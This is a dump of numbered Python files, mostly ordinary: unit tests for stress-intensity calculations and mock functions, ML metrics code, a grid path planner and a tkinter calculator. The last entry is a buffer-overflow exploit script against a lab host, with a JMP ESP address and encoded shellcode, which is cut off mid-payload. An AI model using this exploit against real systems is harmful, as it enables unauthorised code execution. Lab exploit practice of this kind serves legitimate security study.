expected = 356.82482323055\n        for beta in betas:\n            self.assertAlmostEqual(expected, calcK1(a, b, beta, sigma))\n\n    def test_calcK1_with_a10_b20_sigma100(self):\n        a, b = 10, 20\n        betas = [0, 60, 90, 180, 240, 300, 360, 400]\n        sigma = 100\n        for beta in betas:\n            self.assertRaises(AssertionError, calcK1, a, b, beta, sigma)\n\n    def test_calcK1_with_a20_b10_sigma0(self):\n        a, b = 20, 20\n        betas = [0, 60, 90, 180, 240, 300, 360, 400]\n        sigma = 0\n        for beta in betas:\n            self.assertAlmostEqual(0, calcK1(a, b, beta, sigma))\n\n\nclass TestCalcK2(unittest.TestCase):\n\n    def setUp(self):\n        self.v = 0.3\n        self.tao = 100\n        self.beta = 45\n        self.omega = 60\n\n    def test_calcK2_with_a20_b10_tao100(self):\n        a, b = 20, 10\n        betas = [0, 60, 90,\n                 180, 240, 300,\n                 360, 400]\n        expected = [-151.81193289, -364.761525373456, -343.0689272125,\n                    151.81193289, 364.761525373456, 304.324782974556,\n                    -151.81193289388983, -369.32377154114926]\n        for beta, k2 in zip(betas, expected):\n            self.assertAlmostEqual(\n                k2,\n                calcK2(\n                    a,\n                    b,\n                    self.v,\n                    beta,\n                    self.omega,\n                    self.tao))\n\n    def test_calcK2_with_a20_b20_tao100(self):\n        a, b = 20, 20\n        expected = -398.73343769\n        self.assertAlmostEqual(\n            expected,\n            calcK2(\n                a,\n                b,\n                self.v,\n                self.beta,\n                self.omega,\n                self.tao))\n\n    def test_calcK2_with_a20_b10_tao0(self):\n        a, b = 20, 10\n        tao = 0\n        expected = 0\n        self.assertAlmostEqual(\n            expected,\n            calcK2(\n                a,\n                b,\n                self.v,\n                self.beta,\n                self.omega,\n                tao))\n\n    def test_calcK2_with_a10_b20_tao100(self):\n        a, b = 10, 20\n        self.assertRaises(AssertionError, calcK2,\n                          a, b, self.v, self.beta, self.omega, self.tao)\n\n\nclass TestCalcK3(unittest.TestCase):\n\n    def setUp(self):\n        self.v = 0.3\n        self.tao = 100\n        self.beta = 45\n        self.omega = 60\n\n    def test_calcK3_with_a20_b10_tao100(self):\n        a, b = 20, 10\n        betas = [0, 60, 90,\n                 180, 240, 300,\n                 360, 400]\n        expected = [-169.8104553924517, 112.75031034975231, 150.28614610002944,\n                    169.81045539245176, -112.7503103497523, -180.35231339102046,\n                    -169.81045539245181, 71.441969172512316]\n        for beta, k2 in zip(betas, expected):\n            self.assertAlmostEqual(\n                k2,\n                calcK3(\n                    a,\n                    b,\n                    self.v,\n                    beta,\n                    self.omega,\n                    self.tao))\n\n    def test_calcK3_with_a20_b20_tao100(self):\n        a, b = 20, 20\n        expected = -26.80015418\n        self.assertAlmostEqual(\n            expected,\n            calcK3(\n                a,\n                b,\n                self.v,\n                self.beta,\n                self.omega,\n                self.tao))\n\n    def test_calcK3_with_a20_b10_tao0(self):\n        a, b = 20, 10\n        tao = 0\n        expected = 0\n        self.assertAlmostEqual(\n            expected,\n            calcK3(\n                a,\n                b,\n                self.v,\n                self.beta,\n                self.omega,\n                tao))\n\n    def test_calcK3_with_a10_b20_tao100(self):\n        a, b = 10, 20\n        self.assertRaises(AssertionError, calcK3,\n                          a, b, self.v, self.beta, self.omega, self.tao)\n\n\nclass TestCalcAnSolWrapper(unittest.TestCase):\n\n    def setUp(self):\n        self.betas = ['a', 'b', 'c']\n        self.mockK1 = MagicMock(return_value=1)\n        self.mockK2 = MagicMock(return_value=2)\n        self.mockK3 = MagicMock(return_value=3)\n        self.mockStr = MagicMock(return_value=('sigma', 'tao'))\n        self.patches = [\n            patch(modulePrefix + 'calcK1', self.mockK1),\n            patch(modulePrefix + 'calcK2', self.mockK2),\n            patch(modulePrefix + 'calcK3', self.mockK3),\n            patch(modulePrefix + 'calcStresses', self.mockStr)]\n        for p in self.patches:\n            p.start()\n\n    def tearDown(self):\n        for p in self.patches:\n            p.stop()\n\n    def test_calcAnSolWrapper_with_K1_sifKey(self):\n        res = calcAnSolWrapper('K1', 'a', 'b', 'v', self.betas,\n                               'gamma', 'omega', 'stress')\n        self.mockStr.assert_called_once_with(\n            tensileStress='stress', gamma='gamma')\n        self.assertEqual(len(self.betas), self.mockK1.call_count)\n        self.assertEqual(len(self.betas) * [1], res)\n        for beta in self.betas:\n            self.mockK1.assert_any_call(axisA='a', axisB='b',\n                                        beta=beta, sigma='sigma')\n\n    def test_calcAnSolWrapper_with_K2_sifKey(self):\n        res = calcAnSolWrapper('K2', 'a', 'b', 'v', self.betas,\n                               'gamma', 'omega', 'stress')\n        self.mockStr.assert_called_once_with(\n            tensileStress='stress', gamma='gamma')\n        self.assertEqual(len(self.betas), self.mockK2.call_count)\n        self.assertEqual(len(self.betas) * [2], res)\n        for beta in self.betas:\n            self.mockK2.assert_any_call(axisA='a', axisB='b', v='v',\n                                        beta=beta, omega='omega', tao='tao')\n\n    def test_calcAnSolWrapper_with_K3_sifKey(self):\n        res = calcAnSolWrapper('K3', 'a', 'b', 'v', self.betas,\n                               'gamma', 'omega', 'stress')\n        self.mockStr.assert_called_once_with(\n            tensileStress='stress', gamma='gamma')\n        self.assertEqual(len(self.betas), self.mockK3.call_count)\n        self.assertEqual(len(self.betas) * [3], res)\n        for beta in self.betas:\n            self.mockK3.assert_any_call(axisA='a', axisB='b', v='v',\n                                        beta=beta, omega='omega', tao='tao')\n\n    def test_calcAnSolWrapper_with_undefined_sifKey(self):\n        self.assertRaises(\n            KeyError,\n            calcAnSolWrapper,\n            'unknown_sifKey',\n            'a',\n            'b',\n            'v',\n            self.betas,\n            'gamma',\n            'omega',\n            'stress')\n", "345": "#!/usr/bin/env python\n# Copyright 2013 The Chromium Authors. All rights reserved.\n# Use of this source code is governed by a BSD-style license that can be\n# found in the LICENSE file.\n\nimport unittest\n\nfrom mock_function import MockFunction\n\n\nclass MockFunctionUnittest(unittest.TestCase):\n  def testMockFunction(self):\n    @MockFunction\n    def calc(a, b, mult=1):\n      return (a + b) * mult\n\n    self.assertTrue(*calc.CheckAndReset(0))\n    self.assertEqual(\n        (False, 'calc: expected 1 call(s), got 0'), calc.CheckAndReset(1))\n\n    self.assertEqual(20, calc(2, 3, mult=4))\n    self.assertTrue(*calc.CheckAndReset(1))\n    self.assertTrue(*calc.CheckAndReset(0))\n\n    self.assertEqual(20, calc(2, 3, mult=4))\n    self.assertEqual(\n        (False, 'calc: expected 0 call(s), got 1'), calc.CheckAndReset(0))\n\n    self.assertEqual(3, calc(1, 2))\n    self.assertEqual(0, calc(3, 4, mult=0))\n    self.assertTrue(*calc.CheckAndReset(2))\n    self.assertTrue(*calc.CheckAndReset(0))\n\n    self.assertEqual(3, calc(1, 2))\n    self.assertEqual(0, calc(3, 4, mult=0))\n    self.assertEqual(\n        (False, 'calc: expected 3 call(s), got 2'), calc.CheckAndReset(3))\n\n\nif __name__ == '__main__':\n  unittest.main()\n", "346": "#!/usr/bin/env python\n# Copyright 2013 The Chromium Authors. All rights reserved.\n# Use of this source code is governed by a BSD-style license that can be\n# found in the LICENSE file.\n\nimport unittest\n\nfrom mock_function import MockFunction\n\n\nclass MockFunctionUnittest(unittest.TestCase):\n  def testMockFunction(self):\n    @MockFunction\n    def calc(a, b, mult=1):\n      return (a + b) * mult\n\n    self.assertTrue(*calc.CheckAndReset(0))\n    self.assertEqual(\n        (False, 'calc: expected 1 call(s), got 0'), calc.CheckAndReset(1))\n\n    self.assertEqual(20, calc(2, 3, mult=4))\n    self.assertTrue(*calc.CheckAndReset(1))\n    self.assertTrue(*calc.CheckAndReset(0))\n\n    self.assertEqual(20, calc(2, 3, mult=4))\n    self.assertEqual(\n        (False, 'calc: expected 0 call(s), got 1'), calc.CheckAndReset(0))\n\n    self.assertEqual(3, calc(1, 2))\n    self.assertEqual(0, calc(3, 4, mult=0))\n    self.assertTrue(*calc.CheckAndReset(2))\n    self.assertTrue(*calc.CheckAndReset(0))\n\n    self.assertEqual(3, calc(1, 2))\n    self.assertEqual(0, calc(3, 4, mult=0))\n    self.assertEqual(\n        (False, 'calc: expected 3 call(s), got 2'), calc.CheckAndReset(3))\n\n\nif __name__ == '__main__':\n  unittest.main()\n", "347": "from calc import Calc\nimport unittest\nfrom calc import Calc\n\nclass TestCalc(unittest.TestCase):\n    def setUp(self):\n        self.calc = Calc()\n\n    def test_suma(self):\n        self.assertEqual(4, self.calc.sumar(2,2))\n        self.assertEqual(13, self.calc.sumar(1,12))\n        self.assertEqual(1100, self.calc.sumar(100,1000))\n        self.assertEqual(0, self.calc.sumar(0,0))\n        self.assertEqual(\"Invalid\", self.calc.sumar(1,-1))\n\n\n    def test_resta(self):\n        self.assertEqual(0, self.calc.restar(2,2))\n        self.assertEqual(11, self.calc.restar(12,1))\n        self.assertEqual(900, self.calc.restar(1000,100))\n        self.assertEqual(0, self.calc.restar(0,0))\n        self.assertEqual(\"Invalid\", self.calc.restar(1,-1))\n        \n    def test_multiplicar(self):\n        self.assertEqual(4, self.calc.multiplicar(2,2))\n        self.assertEqual(12, self.calc.multiplicar(1,12))\n        self.assertEqual(100000, self.calc.multiplicar(100,1000))\n        self.assertEqual(0, self.calc.multiplicar(0,0))\n        self.assertEqual(\"Invalid\", self.calc.multiplicar(1,-1))\n        \n    def test_dividir(self):\n        self.assertEqual(1.0, self.calc.dividir(2,2))\n        self.assertEqual(12.0, self.calc.dividir(12,1))\n        self.assertEqual(10.0, self.calc.dividir(1000,100))\n        self.assertEqual(\"Invalid\", self.calc.dividir(0,0))\n        self.assertEqual(\"Invalid\", self.calc.dividir(2,-2))\n\nif __name__ == '__main__':\n    unittest.main()\n     ", "348": "import numpy as np\nimport os\n\nfrom scipy import stats\n\nfrom sklearn.metrics import roc_auc_score\n\nfrom src_py.metrics_utils import calculate_deltas_unsigned, calculate_deltas_signed\n\n\ndef weight_fun(x, a, b, c):\n    return a + b * np.cos(x) + c * np.sin(x)\n\ndef calc_weights(num_classes, coeffs):\n    k2PI = 2* np.pi\n    x = np.linspace(0, k2PI, num_classes)\n    data_len = coeffs.shape[0]\n    weights = np.zeros((data_len, num_classes))\n    for i in range(data_len):\n        weights[i] = weight_fun(x, *coeffs[i])\n    return weights\n\ndef calc_argmaxs_distances(pred_arg_maxs, calc_arg_maxs, num_class):\n    return calculate_deltas_signed(calc_arg_maxs, pred_arg_maxs, num_class)\n\n\ndef calculate_metrics_from_file(directory, num_classes):\n#    calc_w = np.load(os.path.join(directory, 'softmax_calc_w.npy'))\n#    preds_w = np.load(os.path.join(directory, 'softmax_preds_w.npy'))\n    preds_w = np.load(os.path.join(directory, 'test_regr_preds_weights.npy'))\n    calc_w = np.load(os.path.join(directory, 'test_regr_calc_weights.npy'))\n    return calculate_metrics(calc_w, preds_w, num_classes)\n\n\ndef calculate_metrics(calc_w, preds_w, num_classes):\n    pred_arg_maxs = np.argmax(preds_w, axis=1)\n    calc_arg_maxs = np.argmax(calc_w, axis=1)\n\n    k2PI = 2 * np.pi\n    calc_pred_argmaxs_abs_distances = calculate_deltas_unsigned( pred_arg_maxs, calc_arg_maxs, num_classes)\n    calc_pred_argmaxs_signed_distances = calculate_deltas_signed(pred_arg_maxs, calc_arg_maxs, num_classes)\n    calc_pred_argmaxs_abs_distances_rad = calc_pred_argmaxs_abs_distances * k2PI/(1.0*num_classes)\n    \n    mean_deltas = np.mean(calc_pred_argmaxs_signed_distances, dtype=np.float64)\n    mean_deltas_err = stats.sem(calc_pred_argmaxs_signed_distances)\n    mean_deltas_rad = mean_deltas * k2PI/(1.0*num_classes)\n    mean_deltas_err_rad = mean_deltas_err * k2PI/(1.0*num_classes)\n\n    acc0 = (calc_pred_argmaxs_abs_distances <= 0).mean()\n    acc1 = (calc_pred_argmaxs_abs_distances <= 1).mean()\n    acc2 = (calc_pred_argmaxs_abs_distances <= 2).mean()\n    acc3 = (calc_pred_argmaxs_abs_distances <= 3).mean()\n\n    acc0_rad = (calc_pred_argmaxs_abs_distances_rad <= 0.25).mean()\n    acc1_rad = (calc_pred_argmaxs_abs_distances_rad <= 0.50).mean()\n    acc2_rad = (calc_pred_argmaxs_abs_distances_rad <= 0.75).mean()\n    acc3_rad = (calc_pred_argmaxs_abs_distances_rad <= 1.00).mean()\n\n    l1_delta_w = np.mean(np.abs(calc_w - preds_w), dtype=np.float64)\n    l2_delta_w = np.sqrt(np.mean((calc_w - preds_w)**2), dtype=np.float64)\n    # problem with format, should not be array\n    l2_delta_w_err = stats.sem((calc_w - preds_w)**2)\n\n    # calc_w, preds_w normalisation to probability\n    calc_w_norm = calc_w / np.sum(calc_w, axis=1)[:, np.newaxis]\n    preds_w_norm = preds_w / np.sum(preds_w, axis=1)[:, np.newaxis]\n \n    l1_delta_w_norm = np.mean(np.abs(calc_w_norm - preds_w_norm), dtype=np.float64)\n    l2_delta_w_norm = np.sqrt(np.mean((calc_w_norm - preds_w_norm)**2), dtype=np.float64)\n    # problem with format, should not be array\n    l2_delta_w_norm_err = stats.sem((calc_w_norm - preds_w_norm)**2)\n  \n    \n    return np.array([acc0, acc1, acc2, acc3, mean_deltas, l1_delta_w, l2_delta_w, mean_deltas_rad, acc0_rad, acc1_rad, acc2_rad, acc3_rad,l1_delta_w_norm, l2_delta_w_norm, mean_deltas_err, mean_deltas_err_rad, l2_delta_w_err, l2_delta_w_norm_err ]) \n\n\ndef calculate_metrics_regr_c012s_from_file(directory, num_classes):\n    calc_c012s = np.load(os.path.join(directory,'test_regr_calc_c012s.npy'))\n    pred_c012s = np.load(os.path.join(directory,'test_regr_preds_c012s.npy'))\n\n    return calculate_metrics_regr_c012s(calc_c012s, pred_c012s, num_classes)\n\n\ndef calculate_metrics_regr_c012s(calc_c012s, pred_c012s, num_classes):\n    calc_w  = calc_weights(num_classes, calc_c012s)\n    preds_w = calc_weights(num_classes, pred_c012s)\n\n    return calculate_metrics(calc_w, preds_w, num_classes)\n\n\ndef get_filename_for_class(pathIN, class_num, subset=None):\n    d = '../monit_npy/nn_rhorho_Variant-All_Unweighted_False_NO_NUM_CLASSES_{class_num}'\n    if subset:\n        d += \"_WEIGHTS_SUBS\" + str(subset)\n    return d\n\n\n# The primary versions of three methods below were\n#  evaluate from tf_model.py\n#  evaluate2 from tf_model.py\n#  both using \n#  evaluate_preds  from tf_model.py\n# when extending to multi-class something is not correctly\n# implemented for handling numpy arrays. \n\n\ndef evaluate_roc_auc(preds, wa, wb):\n    n = len(preds)\n    true_labels = np.concatenate([np.ones(n), np.zeros(n)])\n    preds = np.concatenate([preds, preds])\n    weights = np.concatenate([wa, wb])\n    \n    return roc_auc_score(true_labels, preds, sample_weight=weights)\n\n\ndef calculate_roc_auc(preds_w, calc_w, index_a, index_b):\n    n, num_classes = calc_w.shape\n    true_labels = np.concatenate([np.ones(n), np.zeros(n)])\n    preds = np.concatenate([preds_w[:, index_a], preds_w[:, index_a]])\n    weights = np.concatenate([calc_w[:, index_a], calc_w[:, index_b]])\n\n    return roc_auc_score(true_labels, preds, sample_weight=weights)\n\n# binary classification\ndef test_roc_auc(directory, num_class):\n    calc_w = np.load(os.path.join(directory, 'softmax_calc_w.npy'))\n    preds_w = np.load(os.path.join(directory, 'softmax_preds_w.npy'))\n    \n    oracle_roc_auc = []\n    preds_roc_auc  = []\n    \n    for i in range(0, num_class):\n         oracle_roc_auc  += [calculate_roc_auc(calc_w, calc_w, 0, i)]\n         preds_roc_auc   += [calculate_roc_auc(preds_w, calc_w, 0, i)]\n         print(i,\n                  'oracle_roc_auc: {}'.format(calculate_roc_auc(calc_w, calc_w, 0, i)),\n                  'preds_roc_auc: {}'.format(calculate_roc_auc(preds_w, calc_w, 0, i)))\n\n    return oracle_roc_auc, preds_roc_auc\n", "349": "\"\"\"\n\nGreedy Best-First grid planning\n\nauthor: Erwin Lejeune (@spida_rwin)\n\nSee Wikipedia article (https://en.wikipedia.org/wiki/Best-first_search)\n\n\"\"\"\n\nimport math\n\nimport matplotlib.pyplot as plt\n\nshow_animation = True\n\n\nclass BestFirstSearchPlanner:\n\n    def __init__(self, ox, oy, reso, rr):\n        \"\"\"\n        Initialize grid map for greedy best-first planning\n\n        ox: x position list of Obstacles [m]\n        oy: y position list of Obstacles [m]\n        resolution: grid resolution [m]\n        rr: robot radius[m]\n        \"\"\"\n\n        self.reso = reso\n        self.rr = rr\n        self.calc_obstacle_map(ox, oy)\n        self.motion = self.get_motion_model()\n\n    class Node:\n        def __init__(self, x, y, cost, pind, parent):\n            self.x = x  # index of grid\n            self.y = y  # index of grid\n            self.cost = cost\n            self.pind = pind\n            self.parent = parent\n\n        def __str__(self):\n            return str(self.x) + \",\" + str(self.y) + \",\" + str(\n                self.cost) + \",\" + str(self.pind)\n\n    def planning(self, sx, sy, gx, gy):\n        \"\"\"\n        Greedy Best-First search\n\n        input:\n            s_x: start x position [m]\n            s_y: start y position [m]\n            gx: goal x position [m]\n            gy: goal y position [m]\n\n        output:\n            rx: x position list of the final path\n            ry: y position list of the final path\n        \"\"\"\n\n        nstart = self.Node(self.calc_xyindex(sx, self.minx),\n                           self.calc_xyindex(sy, self.miny), 0.0, -1, None)\n        ngoal = self.Node(self.calc_xyindex(gx, self.minx),\n                          self.calc_xyindex(gy, self.miny), 0.0, -1, None)\n\n        open_set, closed_set = dict(), dict()\n        open_set[self.calc_grid_index(nstart)] = nstart\n\n        while 1:\n            if len(open_set) == 0:\n                print(\"Open set is empty..\")\n                break\n\n            c_id = min(\n                open_set,\n                key=lambda o: self.calc_heuristic(ngoal, open_set[o]))\n\n            current = open_set[c_id]\n\n            # show graph\n            if show_animation:  # pragma: no cover\n                plt.plot(self.calc_grid_position(current.x, self.minx),\n                         self.calc_grid_position(current.y, self.miny), \"xc\")\n                # for stopping simulation with the esc key.\n                plt.gcf().canvas.mpl_connect('key_release_event',\n                                             lambda event:\n                                             [exit(0)\n                                              if event.key == 'escape'\n                                              else None])\n                if len(closed_set.keys()) % 10 == 0:\n                    plt.pause(0.001)\n\n            # Remove the item from the open set\n            del open_set[c_id]\n\n            # Add it to the closed set\n            closed_set[c_id] = current\n\n            if current.x == ngoal.x and current.y == ngoal.y:\n                print(\"Found goal\")\n                ngoal.pind = current.pind\n                ngoal.cost = current.cost\n                break\n\n            # expand_grid search grid based on motion model\n            for i, _ in enumerate(self.motion):\n                node = self.Node(current.x + self.motion[i][0],\n                                 current.y + self.motion[i][1],\n                                 current.cost + self.motion[i][2],\n                                 c_id, current)\n\n                n_id = self.calc_grid_index(node)\n\n                # If the node is not safe, do nothing\n                if not self.verify_node(node):\n                    continue\n\n                if n_id in closed_set:\n                    continue\n\n                if n_id not in open_set:\n                    open_set[n_id] = node\n                else:\n                    if open_set[n_id].cost > node.cost:\n                        open_set[n_id] = node\n        closed_set[ngoal.pind] = current\n        rx, ry = self.calc_final_path(ngoal, closed_set)\n        return rx, ry\n\n    def calc_final_path(self, ngoal, closedset):\n        # generate final course\n        rx, ry = [self.calc_grid_position(ngoal.x, self.minx)], [\n            self.calc_grid_position(ngoal.y, self.miny)]\n        n = closedset[ngoal.parent_index]\n        while n is not None:\n            rx.append(self.calc_grid_position(n.x, self.minx))\n            ry.append(self.calc_grid_position(n.y, self.miny))\n            n = n.parent\n\n        return rx, ry\n\n    @staticmethod\n    def calc_heuristic(n1, n2):\n        w = 1.0  # weight of heuristic\n        d = w * math.hypot(n1.x - n2.x, n1.y - n2.y)\n        return d\n\n    def calc_grid_position(self, index, minp):\n        \"\"\"\n        calc grid position\n\n        :param index:\n        :param minp:\n        :return:\n        \"\"\"\n        pos = index * self.reso + minp\n        return pos\n\n    def calc_xyindex(self, position, min_pos):\n        return round((position - min_pos) / self.reso)\n\n    def calc_grid_index(self, node):\n        return (node.y - self.miny) * self.xwidth + (node.x - self.minx)\n\n    def verify_node(self, node):\n        px = self.calc_grid_position(node.x, self.minx)\n        py = self.calc_grid_position(node.y, self.miny)\n\n        if px < self.minx:\n            return False\n        elif py < self.miny:\n            return False\n        elif px >= self.maxx:\n            return False\n        elif py >= self.maxy:\n            return False\n\n        # collision check\n        if self.obmap[node.x][node.y]:\n            return False\n\n        return True\n\n    def calc_obstacle_map(self, ox, oy):\n\n        self.minx = round(min(ox))\n        self.miny = round(min(oy))\n        self.maxx = round(max(ox))\n        self.maxy = round(max(oy))\n        print(\"min_x:\", self.minx)\n        print(\"min_y:\", self.miny)\n        print(\"max_x:\", self.maxx)\n        print(\"max_y:\", self.maxy)\n\n        self.xwidth = round((self.maxx - self.minx) / self.reso)\n        self.ywidth = round((self.maxy - self.miny) / self.reso)\n        print(\"x_width:\", self.xwidth)\n        print(\"y_width:\", self.ywidth)\n\n        # obstacle map generation\n        self.obmap = [[False for _ in range(self.ywidth)]\n                      for _ in range(self.xwidth)]\n        for ix in range(self.xwidth):\n            x = self.calc_grid_position(ix, self.minx)\n            for iy in range(self.ywidth):\n                y = self.calc_grid_position(iy, self.miny)\n                for iox, ioy in zip(ox, oy):\n                    d = math.hypot(iox - x, ioy - y)\n                    if d <= self.rr:\n                        self.obmap[ix][iy] = True\n                        break\n\n    @staticmethod\n    def get_motion_model():\n        # dx, dy, cost\n        motion = [[1, 0, 1],\n                  [0, 1, 1],\n                  [-1, 0, 1],\n                  [0, -1, 1],\n                  [-1, -1, math.sqrt(2)],\n                  [-1, 1, math.sqrt(2)],\n                  [1, -1, math.sqrt(2)],\n                  [1, 1, math.sqrt(2)]]\n\n        return motion\n\n\ndef main():\n    print(__file__ + \" start!!\")\n\n    # start and goal position\n    sx = 10.0  # [m]\n    sy = 10.0  # [m]\n    gx = 50.0  # [m]\n    gy = 50.0  # [m]\n    grid_size = 2.0  # [m]\n    robot_radius = 1.0  # [m]\n\n    # set obstacle positions\n    ox, oy = [], []\n    for i in range(-10, 60):\n        ox.append(i)\n        oy.append(-10.0)\n    for i in range(-10, 60):\n        ox.append(60.0)\n        oy.append(i)\n    for i in range(-10, 61):\n        ox.append(i)\n        oy.append(60.0)\n    for i in range(-10, 61):\n        ox.append(-10.0)\n        oy.append(i)\n    for i in range(-10, 40):\n        ox.append(20.0)\n        oy.append(i)\n    for i in range(0, 40):\n        ox.append(40.0)\n        oy.append(60.0 - i)\n\n    if show_animation:  # pragma: no cover\n        plt.plot(ox, oy, \".k\")\n        plt.plot(sx, sy, \"og\")\n        plt.plot(gx, gy, \"xb\")\n        plt.grid(True)\n        plt.axis(\"equal\")\n\n    greedybestfirst = BestFirstSearchPlanner(ox, oy, grid_size, robot_radius)\n    rx, ry = greedybestfirst.planning(sx, sy, gx, gy)\n\n    if show_animation:  # pragma: no cover\n        plt.plot(rx, ry, \"-r\")\n        plt.pause(0.01)\n        plt.show()\n\n\nif __name__ == '__main__':\n    main()\n", "350": "import tkinter as tk\r\n\r\nwindow = tk.Tk()\r\n\r\nlbl_calc_result = tk.Label(\r\n    master= window,\r\n    text= '0',\r\n    width= 30,\r\n    height=3,\r\n)\r\nlbl_calc_result.grid(row=0, column=0 , columnspan=4)\r\n\r\nlast_operator_index = -1\r\nlast_dot_index = -1\r\ndef insert_number_in_calc_result(button_number):\r\n    global last_operator_index , last_dot_index\r\n    current = lbl_calc_result['text']\r\n\r\n    if button_number in ['+', '-' , '*']:\r\n        last_operator_index = len(current)\r\n\r\n    if button_number == 'C':\r\n        lbl_calc_result['text'] = '0'\r\n        last_operator_index, last_dot_index = -1,-1\r\n    elif current == '0': \r\n        lbl_calc_result['text'] = button_number\r\n    elif button_number == '=':\r\n        lbl_calc_result['text'] = f'{eval(current)}'\r\n        last_operator_index = -1\r\n        if '.' in lbl_calc_result['text']:\r\n            last_dot_index = len(lbl_calc_result['text'])\r\n    else:\r\n        if button_number == '.':\r\n            if last_dot_index > last_operator_index:\r\n                pass\r\n            elif current[-1] == '.':\r\n                pass\r\n            else:\r\n                lbl_calc_result['text'] += button_number\r\n                last_dot_index = len(current)\r\n\r\n        elif button_number in ['+', '-' , '*']:\r\n            if current[-1] in ['+', '-' , '*']:\r\n                lbl_calc_result['text'] = current[:-1] + button_number\r\n            else:\r\n                lbl_calc_result['text'] += button_number\r\n        else:\r\n            lbl_calc_result['text'] += button_number\r\n\r\n\r\ncalc_list = [\r\n    {\r\n        'text' : '7',\r\n        'command' : lambda:insert_number_in_calc_result('7'),\r\n        'bg' : 'white' ,\r\n    },\r\n    {\r\n        'text' : '8',\r\n        'command' : lambda:insert_number_in_calc_result('8'),\r\n        'bg' : 'white' ,\r\n    },\r\n    {\r\n        'text' : '9',\r\n        'command' : lambda:insert_number_in_calc_result('9'),\r\n        'bg' : 'white' ,\r\n    },\r\n    {\r\n        'text' : '+',\r\n        'command' : lambda:insert_number_in_calc_result('+'),\r\n        'bg' : 'white' ,\r\n    },\r\n        {\r\n        'text' : '4',\r\n        'command' : lambda:insert_number_in_calc_result('4'),\r\n        'bg' : 'white' ,\r\n    },\r\n    {\r\n        'text' : '5',\r\n        'command' : lambda:insert_number_in_calc_result('5'),\r\n        'bg' : 'white' ,\r\n    },\r\n    {\r\n        'text' : '6',\r\n        'command' : lambda:insert_number_in_calc_result('6'),\r\n        'bg' : 'white' ,\r\n    },\r\n    {\r\n        'text' : '-',\r\n        'command' : lambda:insert_number_in_calc_result('-'),\r\n        'bg' : 'white' ,\r\n    },\r\n            {\r\n        'text' : '1',\r\n        'command' : lambda:insert_number_in_calc_result('1'),\r\n        'bg' : 'white' ,\r\n    },\r\n    {\r\n        'text' : '2',\r\n        'command' : lambda:insert_number_in_calc_result('2'),\r\n        'bg' : 'white' ,\r\n    },\r\n    {\r\n        'text' : '3',\r\n        'command' : lambda:insert_number_in_calc_result('3'),\r\n        'bg' : 'white' ,\r\n    },\r\n    {\r\n        'text' : '*',\r\n        'command' : lambda:insert_number_in_calc_result('*'),\r\n        'bg' : 'white' ,\r\n    },\r\n                {\r\n        'text' : '.',\r\n        'command' : lambda:insert_number_in_calc_result('.'),\r\n        'bg' : 'white' ,\r\n    },\r\n    {\r\n        'text' : '0',\r\n        'command' : lambda:insert_number_in_calc_result('0'),\r\n        'bg' : 'white' ,\r\n    },\r\n    {\r\n        'text' : 'C',\r\n        'command' : lambda:insert_number_in_calc_result('C'),\r\n        'bg' : '#f4004f' , \r\n    },\r\n    {\r\n        'text' : '=',\r\n        'command' : lambda:insert_number_in_calc_result('='),\r\n        'bg' : 'white' ,\r\n    },\r\n    \r\n]\r\n\r\ncalc_key_objs = []\r\n\r\nfor calc_key_data in calc_list:\r\n    btn = tk.Button(\r\n        master= window,\r\n        text=calc_key_data['text'],\r\n        command=calc_key_data['command'],\r\n        height=3,\r\n        bg=calc_key_data['bg'],\r\n    )\r\n    calc_key_objs.append(btn)\r\n\r\nfor i, calc_key_obj in enumerate(calc_key_objs):\r\n    calc_key_obj.grid(row=(i//4)+1, column=i%4, sticky='nsew')\r\n\r\nwindow.mainloop()", "351": "#!/usr/bin/env python2\r\nimport socket\r\nimport struct\r\n\r\n# set up the IP and port we're connecting to\r\nRHOST = \"192.168.80.134\"\r\nRPORT = 31337\r\n\r\n# create a TCP connection (socket)\r\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\r\ns.connect((RHOST, RPORT))\r\n\r\n# build a happy little message followed by a newline\r\nbuffer_length=1024\r\nsrp_offset=146\r\n\r\nptr_jmp_esp = 0x80414c3\r\n\r\nsub_esp_10 = \"\\x83\\xec\\x10\"\r\n\r\nshellcode_calc =  \"\"\r\nshellcode_calc += \"\\xb8\\xbf\\x88\\xe5\\x88\\xdb\\xcd\\xd9\\x74\\x24\"\r\nshellcode_calc += \"\\xf4\\x5e\\x31\\xc9\\xb1\\x31\\x83\\xc6\\x04\\x31\"\r\nshellcode_calc += \"\\x46\\x0f\\x03\\x46\\xb0\\x6a\\x10\\x74\\x26\\xe8\"\r\nshellcode_calc += \"\\xdb\\x85\\xb6\\x8d\\x52\\x60\\x87\\x8d\\x01\\xe0\"\r\nshellcode_calc += \"\\xb7\\x3d\\x41\\xa4\\x3b\\xb5\\x07\\x5d\\xc8\\xbb\"\r\nshellcode_calc += \"\\x8f\\x52\\x79\\x71\\xf6\\x5d\\x7a\\x2a\\xca\\xfc\"\r\nshellcode_calc += \"\\xf8\\x31\\x1f\\xdf\\xc1\\xf9\\x52\\x1e\\x06\\xe7\"\r\nshellcode_calc += \"\\x9f\\x72\\xdf\\x63\\x0d\\x63\\x54\\x39\\x8e\\x08\"\r\nshellcode_calc += \"\\x26\\xaf\\x96\\xed\\xfe\\xce\\xb7\\xa3\\x75\\x89\"\r\nshellcode_calc += \"\\x17\\x45\\x5a\\xa1\\x11\\x5d\\xbf\\x8c\\xe8\\xd6\"\r\nshellcode_calc += \"\\x0b\\x7a\\xeb\\x3e\\x42\\x83\\x40\\x7f\\x6b\\x76\"\r\nshellcode_calc += \"\\x98\\x47\\x4b\\x69\\xef\\xb1\\xa8\\x14\\xe8\\x05\"\r\nshellcode_calc += \"\\xd3\\xc2\\x7d\\x9e\\x73\\x80\\x26\\x7a\\x82\\x45\"\r\nshellcode_calc += \"\\xb0\\x09\\x88\\x22\\xb6\\x56\\x8c\\xb5\\x1b\\xed\"\r\nshellcode_calc += \"\\xa8\\x3e\\x9a\\x22\\x39\\x04\\xb9\\xe6\\x62\\xde\"\r\nshellcode_calc += \"\\xa0\\xbf\\xce\\xb1\\xdd\\xa0\\xb1\\x6e\\x78\\xaa\"\r\nshellcode_calc += \"\\x5f\\x7a\\xf1\\xf1\\x35\\x7d\\x87\\x8f\\x7b\\x7d\"\r\nshellcode_calc += \"\\x97\\x8f\\x2b\\x16\\xa6\\x04\\xa4\\x61\\x37\\xcf\"\r\nshellcode_calc += \"\\x81\\x8e\\xd5\\xda\\xff\\x26\\x40\\x8f\\x42\\x2b\"\r\nshellcode_calc += \"\\x73\\x65\\x80\\x52\\xf0\\x8c\\x78\\xa1\\xe8\\xe4\"\r\nshellcode_calc += 